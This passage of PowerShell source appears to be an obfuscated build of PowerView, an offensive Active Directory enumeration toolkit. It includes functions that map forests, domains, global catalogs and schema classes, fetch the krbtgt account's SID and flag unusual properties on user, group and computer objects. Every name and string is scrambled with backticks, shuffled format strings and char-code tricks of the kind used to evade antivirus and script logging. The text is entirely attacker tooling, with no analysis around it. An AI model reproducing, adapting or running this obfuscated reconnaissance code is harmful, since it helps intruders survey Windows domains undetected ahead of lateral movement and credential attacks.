        [Management.Automation.CredentialAttribute()]
        ${CrEDE`NT`iAl} =   ${5r0`Vk}::"emP`Ty"
    )

    PROCESS {
        ${aRgu`ME`N`Ts} = @{}
        if (${pSb`O`UND`Pa`RamET`eRs}[("{0}{1}" -f'Domai','n')]) { ${ar`gUmen`Ts}[("{2}{1}{0}"-f 'in','a','Dom')] = ${d`OmAin} }
        if (${psbo`U`NdPaRa`MeTE`Rs}[("{2}{0}{3}{1}" -f 're','al','C','denti')]) { ${ArguM`en`TS}[("{0}{1}{2}" -f 'Cre','den','tial')] = ${cREdE`NTi`AL} }

        if (${PSBoUNd`pAra`mETe`Rs}[("{0}{1}" -f 'LDA','P')] -or ${pSb`o`UND`PaRa`met`ERs}[("{0}{1}"-f'Serv','er')]) {
            if (${p`sBOUn`dpARAMET`ERS}[("{1}{0}"-f'r','Serve')]) { ${AR`gUMe`N`Ts}[("{0}{1}"-f 'Se','rver')] = ${Se`RveR} }

            
            ${ar`gUM`enTS}[("{2}{1}{0}{3}"-f 'l','DAPFi','L','ter')] = (("{8}{1}{6}{3}{4}{7}{5}{0}{9}{2}"-f'6.1.4.','se','8192)','Contr','ol:1.2.','355','rAccount','840.11','(u','803:='))

            &("{0}{4}{3}{1}{2}" -f'Get-Dom','ute','r','Comp','ain') @Arguments
        }
        else {
            ${fO`UNddO`mA`In} = &("{1}{2}{0}" -f'in','Ge','t-Doma') @Arguments
            if (${FouNddO`m`AiN}) {
                ${fo`UN`DDom`AIN}."dOMaInCOnt`RoL`le`RS"
            }
        }
    }
}


function GE`T-FO`ReST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}{4}" -f 'ces','o','r','PSShouldP','s'}, '')]
    [OutputType({"{3}{6}{0}{2}{7}{5}{4}{8}{9}{10}{1}" -f 'ste','ct','m.M','S','C','omation.PS','y','anagement.Aut','u','stomObj','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSItIon = 0, VALuEFrOMPIpELINe = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`or`ESt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eD`eNtIAL} =   ${5R0Vk}::"EMP`Ty"
    )

    PROCESS {
        if (${PsBoUN`dP`A`RAmETE`RS}[("{2}{1}{0}"-f 'l','a','Credenti')]) {

            &("{2}{1}{0}" -f 'e','ite-Verbos','Wr') ("{5}{1}{8}{7}{9}{11}{2}{0}{3}{12}{4}{6}{10}" -f 'redentials','et-Forest] ','e c',' f',' Get-F','[G','ore',' alte','Using','r','st','nat','or')

            if (${P`sbo`U`ND`paRAmETERS}[("{0}{1}" -f 'For','est')]) {
                ${TArgetF`O`R`eSt} = ${FORe`sT}
            }
            else {
                
                ${tAR`gETFO`REsT} = ${Cre`deNT`i`AL}.("{3}{1}{0}{2}" -f'ork','etNetw','Credential','G').Invoke()."D`oMaiN"
                &("{3}{0}{1}{2}{4}" -f 'te-V','e','rbo','Wri','se') ('[G'+'et-Fores'+'t] '+'Extract'+'ed'+' '+'dom'+'ain'+' '+"'$Forest' "+'from'+' '+'-'+'Credentia'+'l')
            }

            ${fOr`eSTconT`eXt} = &("{0}{1}{3}{2}"-f 'New','-','bject','O') ("{15}{3}{7}{13}{4}{16}{12}{1}{8}{10}{9}{17}{6}{14}{11}{5}{0}{2}" -f 'ex','eDi','t','y','ic','t','Di','stem.Direc','re','or','ct','on','.Activ','toryServ','rectoryC','S','es','y.')(("{0}{1}"-f'Fores','t'), ${TarGE`Tf`o`ResT}, ${CRe`DEnTi`AL}."U`SErna`me", ${cr`E`DenTIal}.("{4}{0}{1}{3}{2}"-f'tN','etwo','redential','rkC','Ge').Invoke()."p`AS`sWORD")

            try {
                ${fOrESTOb`je`cT} =   ${1`In}::("{2}{0}{1}"-f 'o','rest','GetF').Invoke(${fO`Res`TCONt`Ext})
            }
            catch {
                &("{3}{0}{1}{2}" -f'ite','-Verb','ose','Wr') ('['+'Get-For'+'est] '+'T'+'he '+'s'+'pecif'+'ied '+'f'+'o'+'rest '+"'$TargetForest' "+'doe'+'s '+'no'+'t '+'e'+'xist,'+' '+'c'+'oul'+'d '+'not'+' '+'b'+'e '+'c'+'ontact'+'ed'+', '+'th'+'ere '+('i'+'sn3d'+'1t ')."R`E`plaCE"(([char]51+[char]100+[char]49),[stRINg][char]39)+'a'+'n '+'e'+'xisting'+' '+'t'+'rust, '+'o'+'r '+'th'+'e '+'specifie'+'d'+' '+'credent'+'i'+'als '+'a'+'re '+'inv'+'alid:'+' '+"$_")
                ${N`ULL}
            }
        }
        elseif (${ps`BoUN`DPa`RaMEte`Rs}[("{1}{0}"-f'est','For')]) {
            ${fore`ST`co`Nte`xt} = &("{2}{1}{0}"-f 'ct','e','New-Obj') ("{8}{9}{3}{13}{7}{16}{1}{11}{5}{2}{6}{12}{0}{10}{4}{14}{15}" -f 'y','eD','ory','ryServic','nte','t','.Dire','ct','System.','Directo','Co','irec','ctor','es.A','x','t','iv')(("{0}{1}"-f'F','orest'), ${FoRE`sT})
            try {
                ${ForeSt`o`Bje`Ct} =  (&("{0}{3}{2}{1}"-f'gE','E','RiaBL','T-Va')  ("1"+"In") -vALUE)::("{1}{0}"-f 'st','GetFore').Invoke(${f`Or`E`STcONTeXt})
            }
            catch {
                &("{2}{0}{1}{3}" -f'ite','-Verbo','Wr','se') ('['+'Get'+'-Forest] '+'The'+' '+'spe'+'cifi'+'ed '+'fo'+'re'+'st '+"'$Forest' "+'d'+'oes '+'not'+' '+'exis'+'t'+', '+'cou'+'ld '+'n'+'ot '+'b'+'e '+'con'+'tacte'+'d, '+'or'+' '+'the'+'re '+('isn{0}'+'t'+' ') -F[CHAR]39+'an'+' '+'exist'+'ing'+' '+'tr'+'ust: '+"$_")
                return ${n`ULL}
            }
        }
        else {
            
            ${F`ORES`ToBJ`EcT} =  (&("{0}{1}" -f'gC','i')  ("variABLe:1"+"I"+"N")  )."v`ALuE"::("{1}{2}{0}{3}"-f 're','GetCur','rentFo','st').Invoke()
        }

        if (${f`O`RestOBJeCt}) {
            
            if (${PsBOUn`dpar`A`MEtERS}[("{1}{0}{2}" -f 'edenti','Cr','al')]) {
                ${For`E`s`TSId} = (&("{1}{0}{2}{3}" -f'et','G','-DomainUse','r') -Identity ("{1}{0}" -f't','krbtg') -Domain ${FORE`STo`Bje`ct}."ROO`TDom`Ain"."N`AMe" -Credential ${c`R`e`dEntIAL})."oBJE`C`TSid"
            }
            else {
                ${FO`Res`Tsid} = (&("{1}{3}{0}{4}{2}"-f'Do','Ge','inUser','t-','ma') -Identity ("{1}{0}" -f 'btgt','kr') -Domain ${FOREST`OBJ`eCT}."roO`Td`OmAIn"."Na`me")."o`Bj`EctSiD"
            }

            ${Pa`RTs} = ${FO`REs`TsID} -Split '-'
            ${for`ESt`siD} = ${PA`RTS}[0..$(${Pa`RTS}."lEng`Th"-2)] -join '-'
            ${f`oresTo`BJE`Ct} | &("{1}{0}{2}"-f'-Mem','Add','ber') ("{2}{0}{1}"-f 'ro','perty','NoteP') ("{2}{1}{3}{0}" -f'Sid','mai','RootDo','n') ${f`o`RESt`SiD}
            ${fO`R`e`sTOBJEcT}
        }
    }
}


function GeT-`FOR`E`StdOm`AIn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f'dProces','ul','s','PSSho'}, '')]
    [OutputType({"{5}{2}{9}{6}{8}{7}{0}{1}{10}{3}{4}"-f'Directory.','Do','ys','ai','n','S','.DirectoryServi','.Active','ces','tem','m'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitIoN = 0, vALuEFROmpiPEliNe = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${ForE`St},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ed`EntiaL} =   ${5`R0Vk}::"eMP`TY"
    )

    PROCESS {
        ${aR`G`Ume`Nts} = @{}
        if (${PSBoUnDPARA`me`T`ERS}[("{0}{1}"-f 'F','orest')]) { ${a`R`Gume`NTS}[("{0}{1}"-f 'F','orest')] = ${FO`R`eSt} }
        if (${P`sbO`U`NdpAraMeTeRs}[("{2}{1}{0}" -f'ial','dent','Cre')]) { ${ar`G`UmenTS}[("{2}{1}{0}" -f 'tial','den','Cre')] = ${cRE`dENti`Al} }

        ${f`OrE`STo`BjeCT} = &("{0}{1}{2}" -f 'Get-Fo','re','st') @Arguments
        if (${F`OREst`oBJeCt}) {
            ${forES`T`oB`Je`cT}."DomA`Ins"
        }
    }
}


function geT-`FO`Re`s`TgLoBALCATaLOG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{4}{1}{3}" -f'PSSh','roces','oul','s','dP'}, '')]
    [OutputType({"{9}{5}{0}{4}{7}{8}{3}{1}{10}{6}{2}" -f'rec','tory.','Catalog','veDirec','toryServices','i','obal','.','Acti','System.D','Gl'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITIon = 0, vaLUeFROMPipElinE = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oresT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`De`NTi`AL} =   ${5`R0Vk}::"E`MPTY"
    )

    PROCESS {
        ${ar`GUm`e`Nts} = @{}
        if (${ps`BOuND`PaR`AmE`TErs}[("{1}{0}"-f'rest','Fo')]) { ${a`RG`UMEnts}[("{1}{0}"-f'rest','Fo')] = ${F`OreSt} }
        if (${pSBOU`NDpa`RA`mEt`ErS}[("{1}{0}{2}"-f 'eden','Cr','tial')]) { ${ar`gum`Ents}[("{0}{1}{2}"-f 'Crede','nt','ial')] = ${Cre`D`eNtiAl} }

        ${F`oresTObj`e`CT} = &("{1}{0}{2}"-f 'Fo','Get-','rest') @Arguments

        if (${fORe`StobJE`Ct}) {
            ${f`oRE`ST`O`BjecT}.("{0}{4}{3}{6}{2}{5}{1}" -f'F','atalogs','a','ndAl','i','lC','lGlob').Invoke()
        }
    }
}


function G`e`T-`FORE`sts`c`hemAClaSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f 's','e','s','PSShouldProc'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitION = 0, vaLUefrompIPeLInE = ${Tr`Ue})]
        [Alias({"{0}{1}" -f'Clas','s'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CL`A`S`sNAmE},

        [Alias({"{1}{0}" -f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oReSt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`e`N`TIaL} =   (  &("{1}{0}{2}"-f'ar','v','iablE') ("{1}{0}" -f 'vK','5r0') -VAlUEO  )::"E`mptY"
    )

    PROCESS {
        ${a`Rgume`NtS} = @{}
        if (${P`sboUn`Dp`ARaMEteRs}[("{0}{1}"-f'For','est')]) { ${arg`UmeN`Ts}[("{0}{1}"-f'For','est')] = ${fO`REst} }
        if (${PSb`Ound`pAr`AM`etErS}[("{0}{2}{1}"-f'Crede','l','ntia')]) { ${AR`guMEN`TS}[("{1}{0}{2}"-f 'tia','Creden','l')] = ${cR`edeNT`I`Al} }

        ${f`O`REstoBjE`Ct} = &("{0}{2}{1}"-f 'G','st','et-Fore') @Arguments

        if (${fOREsto`B`jE`cT}) {
            if (${p`S`BouNDpaR`AM`EtE`RS}[("{1}{0}{2}" -f 'm','ClassNa','e')]) {
                ForEach (${TA`R`G`etcLaSs} in ${CL`As`SNAME}) {
                    ${F`o`ResTo`BJeCT}."SChE`MA".("{1}{0}" -f's','FindClas').Invoke(${t`Argetc`lA`Ss})
                }
            }
            else {
                ${FO`ReSTObJ`E`ct}."sC`h`EMa".("{2}{0}{4}{3}{1}" -f'dAllC','s','Fin','sse','la').Invoke()
            }
        }
    }
}


function fi`N`d`-DomAInObJect`pRoPERTyo`Ut`Li`eR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}"-f'cess','Pro','d','PSShoul'}, '')]
    [OutputType({"{5}{2}{0}{4}{1}{6}{3}" -f'pe','l','w.Pro','er','rtyOut','PowerVie','i'})]
    [CmdletBinding(DEFaULtPARaMETeRSeTNamE = {"{0}{3}{1}{2}" -f'Cla','Nam','e','ss'})]
    Param(
        [Parameter(poSitIOn = 0, MANDATorY = ${T`RUe}, pArameTeRseTName = "cLA`ss`NAME")]
        [Alias({"{1}{0}" -f 's','Clas'})]
        [ValidateSet({"{1}{0}" -f'r','Use'}, {"{0}{1}"-f 'G','roup'}, {"{0}{2}{1}"-f'Compu','r','te'})]
        [String]
        ${C`lasS`NAmE},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${REfereNC`ePR`Op`eRTys`et},

        [Parameter(vALUEFROMPIpeliNe = ${tr`UE}, ManDatorY = ${t`RuE}, ParamETeRseTnamE = "REFeR`E`Nc`eObJEct")]
        [PSCustomObject]
        ${reFeRENc`E`o`B`JECT},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${lD`AP`FIl`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'A','DSPath'})]
        [String]
        ${SEA`RCHB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{3}{2}" -f 'Doma','inContr','ller','o'})]
        [String]
        ${SE`Rver},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{2}{1}" -f'OneLe','l','ve'}, {"{0}{1}"-f 'Sub','tree'})]
        [String]
        ${S`eA`RcHScopE} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsuLT`pag`ESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVE`R`Ti`MElImiT},

        [Switch]
        ${t`o`mBSTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`en`T`IAL} =   (&("{1}{0}"-f 'r','DI') ('vaRIaBL'+'E'+':5r'+'0Vk')  )."val`UE"::"E`MpTy"
    )

    BEGIN {
        ${uSeRreF`eRe`NcEpROpE`RT`ysEt} = @(("{2}{0}{1}"-f 'dm','incount','a'),("{2}{4}{1}{0}{3}" -f 'oun','c','a','texpires','c'),("{1}{0}{2}{3}" -f'o','badpassw','rdti','me'),("{3}{0}{1}{2}" -f'adpwd','c','ount','b'),'cn',("{2}{0}{1}" -f'epag','e','cod'),("{2}{3}{0}{1}"-f'yc','ode','c','ountr'),("{2}{0}{1}" -f 'ri','ption','desc'), ("{2}{0}{1}"-f'spl','ayname','di'),("{1}{3}{0}{2}" -f'ishe','di','dname','stingu'),("{0}{3}{5}{2}{1}{4}" -f'd','dat','repropagation','s','a','co'),("{0}{1}{2}"-f'g','iv','enname'),("{3}{0}{1}{2}"-f'nst','anc','etype','i'),("{0}{4}{1}{3}{5}{2}"-f 'iscrit','al','ject','systemo','ic','b'),("{1}{0}{2}"-f'l','last','ogoff'),("{1}{0}{2}" -f 'o','lastl','gon'),("{0}{4}{2}{1}{3}" -f 'lastl','a','st','mp','ogontime'),("{2}{0}{3}{1}" -f't','e','lockout','im'),("{1}{0}{2}{3}"-f 'nc','logo','oun','t'),("{1}{0}" -f 'of','member'),("{5}{3}{6}{4}{0}{1}{2}"-f'p','e','s','edenc','y','msds-support','ryptiont'),("{1}{0}"-f'e','nam'),("{2}{0}{3}{1}" -f 't','gory','objectca','e'),("{1}{2}{0}{3}"-f'a','objectc','l','ss'),("{3}{2}{1}{0}"-f'd','ctgui','je','ob'),("{2}{1}{0}"-f'jectsid','b','o'),("{2}{1}{3}{4}{0}" -f'ygroupid','i','pr','m','ar'),("{0}{2}{1}" -f'pwdlas','t','tse'),("{4}{1}{2}{3}{0}"-f'name','a','m','account','s'),("{1}{4}{3}{0}{2}" -f'typ','sa','e','count','mac'),'sn',("{2}{3}{4}{0}{1}{5}"-f 't','contr','u','ser','accoun','ol'),("{3}{0}{2}{4}{1}" -f 'rpr','name','incip','use','al'),("{1}{0}{3}{2}" -f 'c','usn','d','hange'),("{1}{0}{2}" -f 'at','usncre','ed'),("{1}{2}{3}{0}" -f 'nged','whe','n','cha'),("{0}{2}{1}" -f 'whencre','d','ate'))

        ${gROuPr`e`FeR`ENc`epRoPE`Rt`ySET} = @(("{0}{1}{2}"-f 'admin','c','ount'),'cn',("{2}{1}{0}"-f'on','scripti','de'),("{1}{2}{0}{3}" -f 'inguishednam','d','ist','e'),("{1}{3}{0}{4}{2}"-f'prop','dsco','iondata','re','agat'),("{0}{1}{2}" -f'g','roup','type'),("{2}{0}{3}{1}" -f'a','ype','inst','ncet'),("{4}{1}{3}{2}{5}{0}"-f't','ritica','emobje','lsyst','isc','c'),("{1}{0}" -f 'ember','m'),("{1}{0}{2}"-f'o','member','f'),("{0}{1}" -f 'na','me'),("{1}{0}{2}" -f 'c','object','ategory'),("{2}{1}{0}" -f 's','ectclas','obj'),("{1}{2}{0}"-f 'uid','o','bjectg'),("{0}{2}{1}" -f 'obje','d','ctsi'),("{2}{0}{1}{3}" -f 'amacco','unt','s','name'),("{0}{1}{3}{4}{2}" -f 's','am','type','acc','ount'),("{0}{1}{2}"-f 'sy','st','emflags'),("{2}{3}{0}{1}" -f 'a','nged','usn','ch'),("{2}{1}{0}" -f'd','ncreate','us'),("{2}{1}{3}{0}"-f 'd','h','w','enchange'),("{2}{3}{0}{1}" -f'rea','ted','w','henc'))

        ${c`o`mputeRref`Ere`N`CEpr`OPertys`et} = @(("{0}{3}{1}{2}" -f'accou','expi','res','nt'),("{0}{2}{1}{3}"-f 'ba','pas','d','swordtime'),("{3}{0}{1}{2}" -f 'd','pw','dcount','ba'),'cn',("{1}{0}"-f 'epage','cod'),("{0}{1}{2}" -f 'c','ountry','code'),("{2}{3}{5}{1}{4}{0}"-f 'name','is','d','i','hed','stingu'),("{0}{3}{1}{2}"-f'dnsho','tnam','e','s'),("{0}{3}{2}{4}{1}" -f'dscorepropaga','a','ionda','t','t'),("{1}{0}{3}{2}" -f 'nst','i','ype','ancet'),("{0}{1}{4}{3}{2}"-f 'iscr','itic','t','mobjec','alsyste'),("{1}{2}{0}" -f'goff','las','tlo'),("{0}{2}{1}" -f 'la','logon','st'),("{0}{1}{3}{2}{4}"-f 'last','logo','es','ntim','tamp'),("{0}{2}{1}{3}{4}"-f 'lo','ic','calpol','yfl','ags'),("{1}{0}{2}" -f 'go','lo','ncount'),("{6}{0}{5}{1}{3}{4}{2}"-f'ppo','yp','ontypes','t','i','rtedencr','msds-su'),("{0}{1}" -f 'na','me'),("{4}{3}{0}{2}{1}"-f 'at','ry','ego','jectc','ob'),("{0}{2}{3}{1}" -f'ob','s','jectc','las'),("{1}{2}{0}"-f'd','ob','jectgui'),("{0}{2}{1}" -f 'obje','tsid','c'),("{0}{2}{1}" -f 'operatin','stem','gsy'),("{1}{4}{3}{2}{0}" -f'ck','operati','epa','gsystemservic','n'),("{4}{5}{1}{0}{2}{3}{6}"-f 'sys','g','temver','sio','ope','ratin','n'),("{2}{0}{1}" -f 'maryg','roupid','pri'),("{2}{1}{0}{3}"-f 'tse','wdlas','p','t'),("{0}{3}{2}{1}" -f 's','countname','c','ama'),("{2}{3}{0}{1}" -f 'ac','counttype','s','am'),("{4}{2}{1}{5}{3}{0}" -f'e','rv','e','ceprincipalnam','s','i'),("{4}{3}{2}{0}{1}" -f 'ntro','l','co','count','userac'),("{1}{0}{2}" -f 'snch','u','anged'),("{2}{1}{0}"-f'ed','reat','usnc'),("{2}{0}{1}" -f'c','hanged','when'),("{2}{1}{0}"-f'ted','a','whencre'))

        ${searcHer`ArGU`m`e`N`Ts} = @{}
        if (${PSB`OuNDPARAMET`e`RS}[("{0}{1}{2}"-f'Dom','ai','n')]) { ${se`A`RcH`e`RARguMENts}[("{2}{1}{0}" -f 'n','omai','D')] = ${DO`Ma`in} }
        if (${psb`o`UND`pARam`eteRs}[("{0}{2}{1}"-f 'L','Filter','DAP')]) { ${SeaRCH`E`RARgU`mEnTs}[("{2}{0}{1}"-f 'DAPFil','ter','L')] = ${Ldap`F`ILTEr} }
        if (${p`S`BoUNdPa`RAMETE`Rs}[("{2}{0}{1}"-f'rch','Base','Sea')]) { ${s`Ea`RC`HeRar`G`UmeNtS}[("{2}{0}{1}" -f 'rchBas','e','Sea')] = ${Se`AR`cH`BASE} }
        if (${psBOUn`DParaM`eT`eRs}[("{1}{0}" -f 'rver','Se')]) { ${sE`ARc`HEraRGuME`NTS}[("{1}{0}" -f'ver','Ser')] = ${se`RV`er} }
        if (${P`SBOUn`DpARA`M`ETe`Rs}[("{2}{0}{1}"-f 'earchScop','e','S')]) { ${s`eaR`c`H`ERaRGUMEN`TS}[("{0}{1}{2}" -f'Sea','r','chScope')] = ${S`EArChScO`pe} }
        if (${P`SbOUnD`pA`RAMetE`RS}[("{2}{3}{0}{1}"-f 'geS','ize','Resu','ltPa')]) { ${se`ARcHe`RaRGu`m`eNTS}[("{2}{0}{1}{4}{3}" -f'esultPa','g','R','e','eSiz')] = ${rEsUlt`P`AGesIze} }
        if (${PsBOUndpaRa`MeT`e`RS}[("{0}{1}{3}{2}"-f'Ser','verT','Limit','ime')]) { ${SE`AR`che`RARGUM`eNTs}[("{3}{2}{1}{0}{4}"-f'meL','erTi','v','Ser','imit')] = ${sERVe`RTIMeL`im`It} }
        if (${Psbo`U`NDPa`Ram`ETERS}[("{2}{0}{1}" -f'omb','stone','T')]) { ${sea`Rc`HerArg`UmenTs}[("{0}{1}" -f 'Tombs','tone')] = ${tOmB`sTO`Ne} }
        if (${PSbOuNDpA`RA`me`Te`Rs}[("{2}{1}{0}" -f 'tial','reden','C')]) { ${seArcHE`R`ARg`UMe`NtS}[("{3}{2}{0}{1}" -f 'den','tial','e','Cr')] = ${cRE`d`En`TIaL} }

        
        if (${pSbOun`dpa`RA`m`eTe`Rs}[("{0}{1}"-f'Domai','n')]) {
            if (${pSbounD`P`Ara`m`e`Ters}[("{2}{0}{1}"-f 'r','edential','C')]) {
                ${TA`Rg`eTfoREST} = &("{2}{0}{1}" -f 'et-D','omain','G') -Domain ${dO`M`AiN} | &("{2}{0}{1}{3}"-f'elect-Ob','j','S','ect') -ExpandProperty ("{0}{1}{2}" -f 'F','o','rest') | &("{3}{1}{0}{2}"-f 'jec','b','t','Select-O') -ExpandProperty ("{1}{0}" -f 'e','Nam')
            }
            else {
                ${targ`e`TfOr`eSt} = &("{0}{2}{1}"-f 'G','main','et-Do') -Domain ${DoMa`iN} -Credential ${cRe`D`enT`IAl} | &("{0}{3}{2}{1}"-f 'Sele','t','Objec','ct-') -ExpandProperty ("{0}{1}" -f 'For','est') | &("{0}{2}{1}"-f 'Sel','ect','ect-Obj') -ExpandProperty ("{0}{1}" -f'Na','me')
            }
            &("{0}{2}{1}{3}"-f'Wri','o','te-Verb','se') ('[Find-Domai'+'nOb'+'j'+'ectPr'+'ope'+'rtyOu'+'tlier'+'] '+'Enume'+'rate'+'d '+'fores'+'t '+"'$TargetForest' "+'fo'+'r '+'t'+'arget'+' '+'d'+'omain'+' '+"'$Domain'")
        }

        ${S`c`HeMa`ARGum`enTs} = @{}
        if (${pSboUN`D`Pa`RaM`ETers}[("{1}{2}{0}"-f'al','Credent','i')]) { ${S`chE`MAArgUmenTs}[("{2}{0}{1}"-f 'r','edential','C')] = ${CR`EDe`Nt`iAL} }
        if (${T`ArGetFor`E`sT}) {
            ${ScHeMA`AR`g`Ume`N`TS}[("{1}{2}{0}" -f't','F','ores')] = ${TaR`gETFO`RE`sT}
        }
    }

    PROCESS {

        if (${psBOU`N`DPa`R`A`metErS}[("{1}{3}{2}{0}"-f'ertySet','Ref','p','erencePro')]) {
            &("{0}{1}{4}{2}{3}" -f 'Wr','ite-Ver','o','se','b') ("{7}{10}{12}{1}{15}{6}{4}{13}{8}{5}{2}{9}{11}{14}{3}{0}{16}"-f'Pro','nObje','in',' -Reference','ut','] Us','yO','[Find-Dom','ier','g spec','a','ifi','i','l','ed','ctPropert','pertySet')
            ${Re`FEREnCEobJE`CTPROp`E`Rt`i`Es} = ${rEFe`RENCEPR`Op`e`Rtys`eT}
        }
        elseif (${pS`BouNdP`Ar`AmEteRS}[("{2}{1}{0}"-f 'ject','b','ReferenceO')]) {
            &("{3}{2}{1}{0}"-f'rbose','e-Ve','t','Wri') ("{3}{4}{24}{7}{23}{8}{6}{21}{0}{20}{19}{14}{18}{1}{10}{22}{16}{2}{5}{9}{15}{17}{11}{13}{12}"-f'property names','renceObject to','e','[Find-D','omainObjectProp',' refer','Extracti','tli','r] ','e',' ','p','y set','ropert','-','nc','th','e ','Refe','from ',' ','ng ','use as ','e','ertyOu')
            ${ReFE`REncEOBjE`CtP`RO`pertiEs} = &("{1}{2}{0}"-f'Member','Ge','t-') -InputObject ${Re`FEREn`ceOb`Je`CT} -MemberType ("{0}{2}{1}{3}"-f 'N','Pro','ote','perty') | &("{2}{0}{1}{3}" -f'lec','t-Ob','Se','ject') -Expand ("{0}{1}" -f'Nam','e')
            ${rEFeRE`NC`EoBJe`ctclAss} = ${R`eFeRenCEO`BjECT}."oBJeCTcl`A`SS" | &("{0}{1}{3}{2}"-f'Sel','ect-','ect','Obj') -Last 1
            &("{1}{2}{0}"-f 'erbose','Wri','te-V') ('[Find-'+'D'+'oma'+'in'+'Ob'+'jectP'+'roperty'+'O'+'u'+'tlier] '+'Calcu'+'late'+'d '+'Referen'+'ceObj'+'ectCl'+'ass'+' '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{2}{0}{1}" -f 'erb','ose','Write-V') ('['+'Find-Domai'+'n'+'Obje'+'ctP'+'rop'+'er'+'tyOutlier'+'] '+'Usi'+'ng '+'th'+'e '+'defaul'+'t '+'r'+'efer'+'ence '+'p'+'ro'+'perty '+'set'+' '+'for'+' '+'t'+'he '+'ob'+'ject '+'cl'+'ass '+"'$ClassName'")
        }

        if ((${C`laS`SnaMe} -eq ("{1}{0}"-f'er','Us')) -or (${REfErENc`EO`B`J`eCtClAss} -eq ("{1}{0}"-f'ser','U'))) {
            ${O`B`jectS} = &("{1}{2}{0}" -f 'User','Get-','Domain') @SearcherArguments
            if (-not ${REFEr`ENc`eo`BJ`ECtpRoPe`R`Ti`Es}) {
                ${r`E`FerE`Nc`EOBJeCtp`RoP`eRtiES} = ${US`Er`R`EFERENc`e`p`RoPERt`ysEt}
            }
        }
        elseif ((${CL`As`s`Name} -eq ("{1}{0}"-f'up','Gro')) -or (${ReFE`RENceOb`j`ECtCLA`Ss} -eq ("{1}{0}" -f 'up','Gro'))) {
            ${oB`j`EctS} = &("{1}{2}{0}{3}" -f'om','Ge','t-D','ainGroup') @SearcherArguments
            if (-not ${reFERen`c`eobJECT`p`ROpe`R`TieS}) {
                ${rE`Fe`ReNC`EO`BJ`EC`TPr`opErtiEs} = ${gRo`U`PReF`e`R`eNCep`ROPe`R`TYSeT}
            }
        }
        elseif ((${c`lA`SsName} -eq ("{1}{2}{0}"-f'er','Com','put')) -or (${R`eFEr`Enc`eoBjECTcl`A`SS} -eq ("{1}{0}{2}"-f 'e','Comput','r'))) {
            ${obj`Ec`TS} = &("{4}{0}{1}{3}{2}" -f '-Doma','inCom','uter','p','Get') @SearcherArguments
            if (-not ${refERe`NC`E`oB`JE`CTprOPEr`Ties}) {
                ${rE`FeRencEoBJeC`T`prOPer`T`i`es} = ${CoMpU`TeRReFEr`EN`CEPROPeRt`y`seT}
            }
        }
        else {
            throw ('[F'+'in'+'d'+'-DomainOb'+'j'+'e'+'c'+'t'+'Prop'+'ert'+'yOutlier] '+'Inva'+'li'+'d '+'cl'+'a'+'ss: '+"$ClassName")
        }

        ForEach (${oBJ`E`ct} in ${Ob`Je`CTS}) {
            ${oB`J`ecTproperT`IEs} = &("{1}{0}{2}" -f '-Me','Get','mber') -InputObject ${oB`JE`CT} -MemberType ("{1}{0}{2}"-f'rt','NotePrope','y') | &("{0}{3}{1}{2}"-f'Sele','je','ct','ct-Ob') -Expand ("{0}{1}"-f'N','ame')
            ForEach(${OB`ject`P`RopER`Ty} in ${o`BjECT`PROp`eRtIEs}) {
                if (${re`FEre`N`CEO`BJe`ctp`RopErtieS} -NotContains ${OB`jEC`TP`RopeRty}) {
                    ${o`UT} = &("{1}{3}{2}{0}"-f'ct','N','je','ew-Ob') ("{1}{0}" -f'Object','PS')
                    ${O`Ut} | &("{2}{1}{0}" -f'mber','dd-Me','A') ("{1}{0}{2}{3}" -f 'pr','Note','op','erty') ("{3}{1}{2}{0}"-f'Name','amA','ccount','S') ${obJE`cT}."Sa`mAC`coUNTn`A`Me"
                    ${o`UT} | &("{2}{1}{0}" -f'Member','d-','Ad') ("{1}{3}{2}{0}"-f 'ty','Note','er','prop') ("{2}{0}{1}"-f'ro','perty','P') ${Ob`jE`cTprO`p`ERTY}
                    ${o`Ut} | &("{1}{0}{2}{3}"-f'd-M','Ad','emb','er') ("{1}{2}{0}{3}"-f 'ro','N','otep','perty') ("{1}{0}"-f'e','Valu') ${OB`Je`Ct}.${oBje`CtP`R`opertY}
                    ${O`UT}."Pso`BjE`cT"."TyPEnA`M`Es".("{0}{1}" -f'I','nsert').Invoke(0, ("{2}{3}{5}{0}{4}{1}{6}"-f'op','li','PowerV','i','ertyOut','ew.Pr','er'))
                    ${o`Ut}
                }
            }
        }
    }
}








function gET-`do`m`AInuseR {


